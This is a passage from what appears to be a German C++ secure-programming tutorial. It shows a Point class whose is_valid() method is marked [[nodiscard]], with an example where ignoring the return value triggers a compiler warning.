11:     int y() const { return m_y; }
12: 
13:     [[nodiscard]] bool is_valid() const {
14:         return m_x >= 0 && m_y >= 0;
15:     }
16: };
17: 
18: void test() {
19:     Point point;
20:     point.is_valid();     // warning: ignoring return value
21: }
```

---

[Zur�ck](./Readme_Secure_Programming.md)

---